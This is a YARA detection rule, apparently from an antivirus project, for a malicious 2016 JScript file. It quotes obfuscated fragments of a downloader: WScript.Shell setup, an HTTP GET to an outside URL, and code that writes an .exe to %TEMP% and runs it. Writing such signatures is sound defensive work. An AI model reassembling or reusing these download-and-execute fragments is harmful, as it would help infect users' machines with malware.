rule sig_20160328_e3e65e549135fa03ff88803b0d5ad952 {
  meta:
    description = "datamaliciousorder - file 20160328_e3e65e549135fa03ff88803b0d5ad952.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "91c3c239b9de4cadd86a52491b7e43c36c0283860a58e1f1cd99f924ebd24d07"

  strings:
    $s1  = "function Rchyxsblm() {return Whsaeazmc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"wjUeqCH1CWjvxx.exe\";};" fullword ascii
    $s2  = "Xhaeccr[Qmdxtgak](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Ydjvmn](Szpvyi() * 11)} while (Xhaeccr[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Whsaeazmc = function Xrqfqzose() {return WScript[Nvzax](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Nvmakyfv(Zrnesoysri, Hcetdgo){return Zrnesoysri - Hcetdgo;};" fullword ascii
    $s6  = "function Qhihmclnk(Hnawxhi){Whsaeazmc[\"Run\"](Hnawxhi, Nsvymttr, Nsvymttr);};" fullword ascii
    $s7  = "function Jaworgazuo() {return ((Jvzcxplidi == true) && (Jvzcxplidi == Mhyuw)) ? 1 : Nsvymttr;};" fullword ascii
    $s8  = "var Cjbijrbjnr = false;" fullword ascii
    $s9  = "var Sandm = new this[\"Date\"]();" fullword ascii
    $s10 = "Mhyuw = true; " fullword ascii
    $s11 = "var Jvzcxplidi = false;" fullword ascii
    $s12 = "function Jxqmstb()" fullword ascii
    $s13 = "return Nvmakyfv(Mamnkt, Rrlyghmdro);" fullword ascii
    $s14 = "function Aqluae(Wpbemsmwg) {var Ivrwhuwlw = (1, 2, 3, 4, 5, Wpbemsmwg); return Ivrwhuwlw;};" fullword ascii
    $s15 = " while (Rtofioq){" fullword ascii
    $s16 = "function Igqxwy(){return Agolusv;};" fullword ascii
    $s17 = "function Szpvyi(){return 22;};" fullword ascii
    $s18 = "var Mhyuw = false;" fullword ascii
    $s19 = "Jvzcxplidi = true; " fullword ascii
    $s20 = "function Fbppspfug(){return Nvzax;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}